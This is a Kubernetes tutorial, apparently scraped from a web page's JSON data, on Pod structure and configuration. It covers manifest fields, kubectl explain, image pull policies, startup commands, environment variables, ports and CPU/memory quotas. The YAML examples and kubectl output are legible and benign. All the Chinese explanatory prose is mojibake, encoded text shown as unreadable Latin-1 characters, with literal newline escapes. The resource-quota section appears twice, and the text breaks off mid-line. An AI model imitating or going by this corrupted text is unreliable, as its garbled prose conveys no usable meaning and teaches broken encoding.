ï¼ç¨äºè®¾ç½®å®¹å¨éè¦çæå°èµæºï¼å¦æç¯å¢èµæºä¸å¤ï¼å®¹å¨å°æ æ³å¯å¨\n\nå¯ä»¥éè¿ä¸é¢ä¸¤ä¸ªéé¡¹è®¾ç½®èµæºçä¸ä¸éãå½éç½®äºåï¼ä¼èªå¨å»æ¾åéçä¸»æºèµæºæ¥å¯å¨ Pod\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-resources.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # èµæºéé¢\n      limits:  # éå¶èµæºï¼ä¸éï¼\n        cpu: "2" # CPUéå¶ï¼åä½æ¯coreæ°\n        memory: "10Gi" # åå­éå¶\n      requests: # è¯·æ±èµæºï¼ä¸éï¼\n        cpu: "1"  # CPUéå¶ï¼åä½æ¯coreæ°\n        memory: "10Mi"  # åå­éå¶\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¨è¿å¯¹ cpu å memory çåä½åä¸ä¸ªè¯´æï¼\n\n * cpuï¼core æ°ï¼å¯ä»¥ä¸ºæ´æ°æå°æ°\n * memoryï¼ åå­å¤§å°ï¼å¯ä»¥ä½¿ç¨ GiãMiãGãM ç­å½¢å¼\n\n# è¿è¡Pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çåç°podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nNAME            READY   STATUS    RESTARTS   AGE  \npod-resources   1/1     Running   0          39s   \n\n# æ¥ä¸æ¥ï¼åæ­¢Pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# ç¼è¾podï¼ä¿®æ¹resources.requests.memoryçå¼ä¸º10Gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# åæ¬¡å¯å¨pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çPodç¶æï¼åç°Podå¯å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nNAME            READY   STATUS    RESTARTS   AGE          \npod-resources   0/1     Pending   0          20s    \n\n# æ¥çpodè¯¦æä¼åç°ï¼å¦ä¸æç¤º\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nWarning  FailedScheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 Insufficient memory.(åå­ä¸è¶³)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',normalizedContent:'# ä»ç»\n\n\n# pod ç»æ\n\n\n\næ¯ä¸ª pod ä¸­é½å¯ä»¥åå«ä¸ä¸ªæèå¤ä¸ªå®¹å¨ï¼è¿äºå®¹å¨å¯ä»¥åä¸ºä¸¤ç±»ï¼\n\n * ç¨æ·ç¨åºæå¨çå®¹å¨ï¼æ°éå¯å¤å¯å°\n * pause å®¹å¨ï¼è¿æ¯æ¯ä¸ª pod é½ä¼æçä¸ä¸ªæ ¹å®¹å¨ï¼å®çä½ç¨æä¸¤ä¸ªï¼\n   * å¯ä»¥ä»¥å®ä¸ºä¾æ®ï¼è¯ä¼°æ´ä¸ª pod çå¥åº·ç¶æ\n   * å¯ä»¥å¨æ ¹å®¹å¨ä¸è®¾ç½® ip å°åï¼å¶å®å®¹å¨é½æ­¤ ipï¼pod ipï¼ï¼ä»¥å®ç° pod åé¨çç½è·¯éä¿¡\n     è¿éæ¯podåé¨çéè®¯ï¼podçä¹é´çéè®¯éç¨èæäºå±ç½ç»ææ¯æ¥å®ç°ï¼æä»¬å½åç¯å¢ç¨çæ¯flannel\n\n\n# pod å®ä¹\n\nä¸é¢æ¯ pod çèµæºæ¸åï¼\n\napiversion: v1     #å¿éï¼çæ¬å·ï¼ä¾å¦v1\nkind: pod       ã #å¿éï¼èµæºç±»åï¼ä¾å¦ pod\nmetadata:       ã #å¿éï¼åæ°æ®\n  name: string     #å¿éï¼podåç§°\n  namespace: string  #podæå±çå½åç©ºé´,é»è®¤ä¸º"default"\n  labels:       ãã  #èªå®ä¹æ ç­¾åè¡¨\n    - name: string      ã          \nspec:  #å¿éï¼podä¸­å®¹å¨çè¯¦ç»å®ä¹\n  containers:  #å¿éï¼podä¸­å®¹å¨åè¡¨\n  - name: string   #å¿éï¼å®¹å¨åç§°\n    image: string  #å¿éï¼å®¹å¨çéååç§°\n    imagepullpolicy: [ always|never|ifnotpresent ]  #è·åéåçç­ç¥ \n    command: [string]   #å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n    args: [string]      #å®¹å¨çå¯å¨å½ä»¤åæ°åè¡¨\n    workingdir: string  #å®¹å¨çå·¥ä½ç®å½\n    volumemounts:       #æè½½å°å®¹å¨åé¨çå­å¨å·éç½®\n    - name: string      #å¼ç¨podå®ä¹çå±äº«å­å¨å·çåç§°ï¼éç¨volumes[]é¨åå®ä¹ççå·å\n      mountpath: string #å­å¨å·å¨å®¹å¨åmountçç»å¯¹è·¯å¾ï¼åºå°äº512å­ç¬¦\n      readonly: boolean #æ¯å¦ä¸ºåªè¯»æ¨¡å¼\n    ports: #éè¦æ´é²çç«¯å£åºå·åè¡¨\n    - name: string        #ç«¯å£çåç§°\n      containerport: int  #å®¹å¨éè¦çå¬çç«¯å£å·\n      hostport: int       #å®¹å¨æå¨ä¸»æºéè¦çå¬çç«¯å£å·ï¼é»è®¤ä¸containerç¸å\n      protocol: string    #ç«¯å£åè®®ï¼æ¯ætcpåudpï¼é»è®¤tcp\n    env:   #å®¹å¨è¿è¡åéè®¾ç½®çç¯å¢åéåè¡¨\n    - name: string  #ç¯å¢åéåç§°\n      value: string #ç¯å¢åéçå¼\n    resources: #èµæºéå¶åè¯·æ±çè®¾ç½®\n      limits:  #èµæºéå¶çè®¾ç½®\n        cpu: string     #cpuçéå¶ï¼åä½ä¸ºcoreæ°ï¼å°ç¨äºdocker run --cpu-sharesåæ°\n        memory: string  #åå­éå¶ï¼åä½å¯ä»¥ä¸ºmib/gibï¼å°ç¨äºdocker run --memoryåæ°\n      requests: #èµæºè¯·æ±çè®¾ç½®\n        cpu: string    #cpuè¯·æ±ï¼å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n        memory: string #åå­è¯·æ±,å®¹å¨å¯å¨çåå§å¯ç¨æ°é\n    lifecycle: #çå½å¨æé©å­\n        poststart: #å®¹å¨å¯å¨åç«å³æ§è¡æ­¤é©å­,å¦ææ§è¡å¤±è´¥,ä¼æ ¹æ®éå¯ç­ç¥è¿è¡éå¯\n        prestop: #å®¹å¨ç»æ­¢åæ§è¡æ­¤é©å­,æ è®ºç»æå¦ä½,å®¹å¨é½ä¼ç»æ­¢\n    livenessprobe:  #å¯¹podååå®¹å¨å¥åº·æ£æ¥çè®¾ç½®ï¼å½æ¢æµæ ååºå æ¬¡åå°èªå¨éå¯è¯¥å®¹å¨\n      exec:       ã #å¯¹podå®¹å¨åæ£æ¥æ¹å¼è®¾ç½®ä¸ºexecæ¹å¼\n        command: [string]  #execæ¹å¼éè¦å¶å®çå½ä»¤æèæ¬\n      httpget:       #å¯¹podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹æ³è®¾ç½®ä¸ºhttpgetï¼éè¦å¶å®pathãport\n        path: string\n        port: number\n        host: string\n        scheme: string\n        httpheaders:\n        - name: string\n          value: string\n      tcpsocket:     #å¯¹podåä¸ªå®¹å¨å¥åº·æ£æ¥æ¹å¼è®¾ç½®ä¸ºtcpsocketæ¹å¼\n         port: number\n       initialdelayseconds: 0       #å®¹å¨å¯å¨å®æåé¦æ¬¡æ¢æµçæ¶é´ï¼åä½ä¸ºç§\n       timeoutseconds: 0    ãã    #å¯¹å®¹å¨å¥åº·æ£æ¥æ¢æµç­å¾ååºçè¶æ¶æ¶é´ï¼åä½ç§ï¼é»è®¤1ç§\n       periodseconds: 0     ãã    #å¯¹å®¹å¨çæ§æ£æ¥çå®ææ¢æµæ¶é´è®¾ç½®ï¼åä½ç§ï¼é»è®¤10ç§ä¸æ¬¡\n       successthreshold: 0\n       failurethreshold: 0\n       securitycontext:\n         privileged: false\n  restartpolicy: [always | never | onfailure]  #podçéå¯ç­ç¥\n  nodename: <string> #è®¾ç½®nodenameè¡¨ç¤ºå°è¯¥podè°åº¦å°æå®å°åç§°çnodeèç¹ä¸\n  nodeselector: obeject #è®¾ç½®nodeselectorè¡¨ç¤ºå°è¯¥podè°åº¦å°åå«è¿ä¸ªlabelçnodeä¸\n  imagepullsecrets: #pulléåæ¶ä½¿ç¨çsecretåç§°ï¼ä»¥keyï¼secretkeyæ ¼å¼æå®\n  - name: string\n  hostnetwork: false   #æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸ºfalseï¼å¦æè®¾ç½®ä¸ºtrueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n  volumes:   #å¨è¯¥podä¸å®ä¹å±äº«å­å¨å·åè¡¨\n  - name: string    #å±äº«å­å¨å·åç§° ï¼volumesç±»åæå¾å¤ç§ï¼\n    emptydir: {}       #ç±»åä¸ºemtydirçå­å¨å·ï¼ä¸podåçå½å¨æçä¸ä¸ªä¸´æ¶ç®å½ãä¸ºç©ºå¼\n    hostpath: string   #ç±»åä¸ºhostpathçå­å¨å·ï¼è¡¨ç¤ºæè½½podæå¨å®¿ä¸»æºçç®å½\n      path: string      ãã        #podæå¨å®¿ä¸»æºçç®å½ï¼å°è¢«ç¨äºåæä¸­mountçç®å½\n    secret:       ããã#ç±»åä¸ºsecretçå­å¨å·ï¼æè½½éç¾¤ä¸å®ä¹çsecretå¯¹è±¡å°å®¹å¨åé¨\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configmap:         #ç±»åä¸ºconfigmapçå­å¨å·ï¼æè½½é¢å®ä¹çconfigmapå¯¹è±¡å°å®¹å¨åé¨\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\nä¸ç¥éç¸å³ç type æä»ä¹èµæºç±»åå¯åï¼å¯ä»¥éè¿ä¸ä¸ªå½ä»¤æ¥æ¥çæ¯ç§èµæºçå¯éç½®é¡¹\n\n#   kubectl explain èµæºç±»å         æ¥çæç§èµæºå¯ä»¥éç½®çä¸çº§å±æ§\n#   kubectl explain èµæºç±»å.å±æ§     æ¥çå±æ§çå­å±æ§\n[root@k8s-master01 ~]# kubectl explain pod\nkind:     pod\nversion:  v1\nfields:\n   apiversion   <string>\n   kind <string>\n   metadata     <object>\n   spec <object>\n   status       <object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nkind:     pod\nversion:  v1\nresource: metadata <object>\nfields:\n   annotations  <map[string]string>\n   clustername  <string>\n   creationtimestamp    <string>\n   deletiongraceperiodseconds   <integer>\n   deletiontimestamp    <string>\n   finalizers   <[]string>\n   generatename <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedfields        <[]object>\n   name <string>\n   namespace    <string>\n   ownerreferences      <[]object>\n   resourceversion      <string>\n   selflink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¨ kubernetes ä¸­åºæ¬ææèµæºçä¸çº§å±æ§é½æ¯ä¸æ ·çï¼ä¸»è¦åå« 5 é¨åï¼\n\n * apiversion çæ¬ï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-versions æ¥è¯¢å°\n * kind ç±»åï¼ç± kubernetes åé¨å®ä¹ï¼çæ¬å·å¿é¡»å¯ä»¥ç¨ kubectl api-resources æ¥è¯¢å°\n * metadata åæ°æ®ï¼ä¸»è¦æ¯èµæºæ è¯åè¯´æï¼å¸¸ç¨çæ nameãnamespaceãlabels ç­\n * spec æè¿°ï¼è¿æ¯éç½®ä¸­æéè¦çä¸é¨åï¼éé¢æ¯å¯¹åç§èµæºéç½®çè¯¦ç»æè¿°\n * status ç¶æä¿¡æ¯ï¼éé¢çåå®¹ä¸éè¦å®ä¹ï¼ç± kubernetes èªå¨çæ\n\nå¨ä¸é¢çå±æ§ä¸­ï¼spec æ¯æ¥ä¸æ¥ç ç©¶çéç¹ï¼ç»§ç»­çä¸å®çå¸¸è§å­å±æ§:\n\n * containers <[] object> å®¹å¨åè¡¨ï¼ç¨äºå®ä¹å®¹å¨çè¯¦ç»ä¿¡æ¯\n * nodename æ ¹æ® nodename çå¼å° pod è°åº¦å°æå®ç node èç¹ä¸\n * nodeselector <map []> æ ¹æ® nodeselector ä¸­å®ä¹çä¿¡æ¯éæ©å°è¯¥ pod è°åº¦å°åå«è¿äº label ç node ä¸\n * hostnetwork æ¯å¦ä½¿ç¨ä¸»æºç½ç»æ¨¡å¼ï¼é»è®¤ä¸º falseï¼å¦æè®¾ç½®ä¸º trueï¼è¡¨ç¤ºä½¿ç¨å®¿ä¸»æºç½ç»\n * volumes <[] object> å­å¨å·ï¼ç¨äºå®ä¹ pod ä¸é¢æå¨çå­å¨ä¿¡æ¯\n * restartpolicy éå¯ç­ç¥ï¼è¡¨ç¤º pod å¨éå°æéçæ¶åçå¤çç­ç¥\n\n\n# pod éç½®\n\nä¸»è¦æ¥ç ç©¶ pod.spec.containers å±æ§ï¼è¿ä¹æ¯ pod éç½®ä¸­æä¸ºå³é®çä¸é¡¹éç½®ã\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nkind:     pod\nversion:  v1\nresource: containers <[]object>   # æ°ç»ï¼ä»£è¡¨å¯ä»¥æå¤ä¸ªå®¹å¨\nfields:\n   name  <string>     # å®¹å¨åç§°\n   image <string>     # å®¹å¨éè¦çéåå°å\n   imagepullpolicy  <string> # éåæåç­ç¥ \n   command  <[]string> # å®¹å¨çå¯å¨å½ä»¤åè¡¨ï¼å¦ä¸æå®ï¼ä½¿ç¨æåæ¶ä½¿ç¨çå¯å¨å½ä»¤\n   args     <[]string> # å®¹å¨çå¯å¨å½ä»¤éè¦çåæ°åè¡¨\n   env      <[]object> # å®¹å¨ç¯å¢åéçéç½®\n   ports    <[]object>     # å®¹å¨éè¦æ´é²çç«¯å£å·åè¡¨\n   resources <object>      # èµæºéå¶åèµæºè¯·æ±çè®¾ç½®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# åºæ¬éç½®\n\nåå»º pod-base.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä¸é¢å®ä¹äºä¸ä¸ªæ¯è¾ç®å pod çéç½®ï¼éé¢æä¸¤ä¸ªå®¹å¨ï¼\n\n * nginxï¼ç¨ 1.17.1 çæ¬ç nginx éååå»ºï¼ï¼nginx æ¯ä¸ä¸ªè½»éçº§ web å®¹å¨ï¼\n * busyboxï¼ç¨ 1.30 çæ¬ç busybox éååå»ºï¼ï¼busybox æ¯ä¸ä¸ªå°å·§ç linux å½ä»¤éåï¼\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# æ¥çpodç¶åµ\n# ready 1/2 : è¡¨ç¤ºå½åpodä¸­æ2ä¸ªå®¹å¨ï¼å¶ä¸­1ä¸ªåå¤å°±ç»ªï¼1ä¸ªæªå°±ç»ª\n# restarts  : éå¯æ¬¡æ°ï¼å ä¸ºæ1ä¸ªå®¹å¨æéäºï¼podä¸ç´å¨éå¯è¯å¾æ¢å¤å®\n[root@k8s-master01 pod]# kubectl get pod -n dev\nname       ready   status    restarts   age\npod-base   1/2     running   4          95s\n\n# å¯ä»¥éè¿describeæ¥çåé¨çè¯¦æ\n# æ­¤æ¶å·²ç»è¿è¡èµ·æ¥äºä¸ä¸ªåºæ¬çpodï¼æä»¥å®ææ¶æé®é¢\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# éåæå\n\nå½æä»¬ç pod å·²ç»æåéåå¹¶å¯å¨å®¹å¨ï¼å¶ä» pod ä¹éè¦æ­¤éåï¼é£ä¹æ­¤æ¶å¶ä» pod æåç¸åéåæ¯ä»éåæºæåï¼è¿æ¯ç´æ¥ä½¿ç¨å·²ç»æåè¿çéåï¼è¿å°±ç± imagepullpolicy æ¥å³å®ã\n\nåå»º pod-imagepullpolicy.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagepullpolicy: never # ç¨äºè®¾ç½®éåæåç­ç¥\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagepullpolicyï¼ç¨äºè®¾ç½®éåæåç­ç¥ï¼kubernetes æ¯æéç½®ä¸ç§æåç­ç¥ï¼\n\n * alwaysï¼æ»æ¯ä»è¿ç¨ä»åºæåéåï¼ä¸ç´è¿ç¨ä¸è½½ï¼\n * ifnotpresentï¼æ¬å°æåä½¿ç¨æ¬å°éåï¼æ¬å°æ²¡æåä»è¿ç¨ä»åºæåéåï¼æ¬å°æå°±æ¬å° æ¬å°æ²¡è¿ç¨ä¸è½½ï¼\n * neverï¼åªä½¿ç¨æ¬å°éåï¼ä»ä¸å»è¿ç¨ä»åºæåï¼æ¬å°æ²¡æå°±æ¥é ï¼ä¸ç´ä½¿ç¨æ¬å°ï¼\n\n> é»è®¤å¼è¯´æ:\n> å¦æéå tag ä¸ºå·ä½çæ¬å·ï¼ é»è®¤ç­ç¥æ¯ï¼ifnotpresent\n> å¦æéå tag ä¸ºï¼latestï¼æç»çæ¬ï¼ ï¼é»è®¤ç­ç¥æ¯ always\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# æ¥çpodè¯¦æ\n# æ­¤æ¶ææ¾å¯ä»¥çå°nginxéåæä¸æ­¥pulling image "nginx:1.17.1"çè¿ç¨\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nevents:\n  type     reason     age               from               message\n  ----     ------     ----              ----               -------\n  normal   scheduled  <unknown>         default-scheduler  successfully assigned dev/pod-imagepullpolicy to node1\n  normal   pulling    32s               kubelet, node1     pulling image "nginx:1.17.1"\n  normal   pulled     26s               kubelet, node1     successfully pulled image "nginx:1.17.1"\n  normal   created    26s               kubelet, node1     created container nginx\n  normal   started    25s               kubelet, node1     started container nginx\n  normal   pulled     7s (x3 over 25s)  kubelet, node1     container image "busybox:1.30" already present on machine\n  normal   created    7s (x3 over 25s)  kubelet, node1     created container busybox\n  normal   started    7s (x3 over 25s)  kubelet, node1     started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¯å¨å½ä»¤\n\nå¨ åºæ¬éç½® çæ¡ä¾ä¸­ï¼æä¸ä¸ªé®é¢æ²¡æè§£å³ï¼å°±æ¯ busybox å®¹å¨ä¸ç´æ²¡ææåè¿è¡ï¼é£ä¹å°åºæ¯ä»ä¹åå å¯¼è´è¿ä¸ªå®¹å¨çæéå¢ï¼\n\nbusybox å¹¶ä¸æ¯ä¸ä¸ªç¨åºï¼èæ¯ç±»ä¼¼äºä¸ä¸ªå·¥å·ç±»çéåï¼kubernetes éç¾¤å¯å¨ç®¡çåï¼å®ä¼èªå¨å³é­ãè§£å³æ¹æ³å°±æ¯è®©å¶ä¸ç´å¨è¿è¡ï¼è¿å°±ç¨å°äº command éç½®ã\n\nåå»º pod-command.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # å®¹å¨å¯å¨æåï¼æ§è¡æ­»å¾ªç¯\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%t) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommandï¼ç¨äºå¨ pod ä¸­çå®¹å¨åå§åå®æ¯ä¹åè¿è¡ä¸ä¸ªå½ä»¤ã\n\n> ç¨å¾®è§£éä¸ä¸é¢å½ä»¤çææï¼\n> "/bin/sh","-c", ä½¿ç¨ sh æ§è¡å½ä»¤\n> touch /tmp/hello.txt; åå»ºä¸ä¸ª /tmp/hello.txt æä»¶\n> while true;do /bin/echo $(date +% t) >> /tmp/hello.txt; sleep 3; done; æ¯é 3 ç§åæä»¶ä¸­åå¥å½åæ¶é´\n\n# åå»ºpod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# æ¥çpodç¶æ\n# æ­¤æ¶åç°ä¸¤ä¸ªpodé½æ­£å¸¸è¿è¡äº\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nname          ready   status   restarts   age\npod-command   2/2     runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nè¿å¥ pod ä¸­ç busybox å®¹å¨ï¼æ¥çæä»¶åå®¹ï¼å½ä»¤å¦ä¸\n\nkubectl exec  podåç§° -n å½åç©ºé´ -it -c å®¹å¨åç§° /bin/sh\n\n\n1\n\n\nä½¿ç¨è¿ä¸ªå½ä»¤å°±å¯ä»¥è¿å¥æä¸ªå®¹å¨çåé¨ï¼ç¶åè¿è¡ç¸å³æä½äºï¼æ¯å¦ï¼å¯ä»¥æ¥ç txt æä»¶çåå®¹ãæ¼ç¤ºï¼\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> ç¹å«è¯´æï¼\n> éè¿ä¸é¢åç° command å·²ç»å¯ä»¥å®æå¯å¨å½ä»¤åä¼ éåæ°çåè½ï¼ä¸ºä»ä¹è¿éè¿è¦æä¾ä¸ä¸ª args éé¡¹ï¼ç¨äºä¼ éåæ°å¢ï¼è¿å¶å®è· docker æç¹å³ç³»ï¼kubernetes ä¸­ç commandãargs ä¸¤é¡¹å¶å®æ¯å®ç°è¦ç dockerfile ä¸­ entrypoint çåè½ã\n> 1 å¦æ command å args åæ²¡æåï¼é£ä¹ç¨ dockerfile çéç½®ã\n> 2 å¦æ command åäºï¼ä½ args æ²¡æåï¼é£ä¹ dockerfile é»è®¤çéç½®ä¼è¢«å¿½ç¥ï¼æ§è¡è¾å¥ç command\n> 3 å¦æ command æ²¡åï¼ä½ args åäºï¼é£ä¹ dockerfile ä¸­éç½®ç entrypoint çå½ä»¤ä¼è¢«æ§è¡ï¼ä½¿ç¨å½å args çåæ°\n> 4 å¦æ command å args é½åäºï¼é£ä¹ dockerfile çéç½®è¢«å¿½ç¥ï¼æ§è¡ command å¹¶è¿½å ä¸ args åæ°\n\n\n# ç¯å¢åé\n\nåå»º pod-env.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%t);sleep 60; done;"]\n    env: # è®¾ç½®ç¯å¢åéåè¡¨\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenvï¼ç¯å¢åéï¼ç¨äºå¨ pod ä¸­çå®¹å¨è®¾ç½®ç¯å¢åéã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# è¿å¥å®¹å¨ï¼è¾åºç¯å¢åé\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè¿ç§æ¹å¼ä¸æ¯å¾æ¨èï¼æ¨èå°è¿äºéç½®åç¬å­å¨å¨éç½®æä»¶ä¸­ï¼è¿ç§æ¹å¼å°å¨åé¢ä»ç»ã\n\n\n# ç«¯å£è®¾ç½®\n\næ¬å°èæ¥ä»ç»å®¹å¨çç«¯å£è®¾ç½®ï¼ä¹å°±æ¯ containers ç ports éé¡¹ã\n\né¦åçä¸ ports æ¯æçå­éé¡¹ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nkind:     pod\nversion:  v1\nresource: ports <[]object>\nfields:\n   name         <string>  # ç«¯å£åç§°ï¼å¦ææå®ï¼å¿é¡»ä¿è¯nameå¨podä¸­æ¯å¯ä¸ç\t\t\n   containerport<integer> # å®¹å¨è¦çå¬çç«¯å£(0<x<65536)\n   hostport     <integer> # å®¹å¨è¦å¨ä¸»æºä¸å¬å¼çç«¯å£ï¼å¦æè®¾ç½®ï¼ä¸»æºä¸åªè½è¿è¡å®¹å¨çä¸ä¸ªå¯æ¬(ä¸è¬çç¥) \n   hostip       <string>  # è¦å°å¤é¨ç«¯å£ç»å®å°çä¸»æºip(ä¸è¬çç¥)\n   protocol     <string>  # ç«¯å£åè®®ãå¿é¡»æ¯udpãtcpæsctpãé»è®¤ä¸ºâtcpâã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-ports.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # è®¾ç½®å®¹å¨æ´é²çç«¯å£åè¡¨\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# æ¥çpod\n# å¨ä¸é¢å¯ä»¥ææ¾çå°éç½®ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagepullpolicy: ifnotpresent\n    name: nginx\n    ports:\n    - containerport: 80\n      name: nginx-port\n      protocol: tcp\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè®¿é®å®¹å¨ä¸­çç¨åºéè¦ä½¿ç¨çæ¯ podip:containerport\n\n\n# èµæºéé¢\n\nå®¹å¨ä¸­çç¨åºè¦è¿è¡ï¼è¯å®æ¯è¦å ç¨ä¸å®èµæºçï¼æ¯å¦ cpu ååå­ç­ï¼å¦æä¸å¯¹æä¸ªå®¹å¨çèµæºåéå¶ï¼é£ä¹å®å°±å¯è½åæå¤§éèµæºï¼å¯¼è´å¶å®å®¹å¨æ æ³è¿è¡ãéå¯¹è¿ç§æåµï¼kubernetes æä¾äºå¯¹åå­å cpu çèµæºè¿è¡éé¢çæºå¶ï¼è¿ç§æºå¶ä¸»è¦éè¿ resources éé¡¹å®ç°ï¼ä»æä¸¤ä¸ªå­éé¡¹ï¼\n\n * limitsï¼ç¨äºéå¶è¿è¡æ¶å®¹å¨çæå¤§å ç¨èµæºï¼å½å®¹å¨å ç¨èµæºè¶è¿ limits æ¶ä¼è¢«ç»æ­¢ï¼å¹¶è¿è¡éå¯\n * requests ï¼ç¨äºè®¾ç½®å®¹å¨éè¦çæå°èµæºï¼å¦æç¯å¢èµæºä¸å¤ï¼å®¹å¨å°æ æ³å¯å¨\n\nå¯ä»¥éè¿ä¸é¢ä¸¤ä¸ªéé¡¹è®¾ç½®èµæºçä¸ä¸éãå½éç½®äºåï¼ä¼èªå¨å»æ¾åéçä¸»æºèµæºæ¥å¯å¨ pod\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-resources.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: 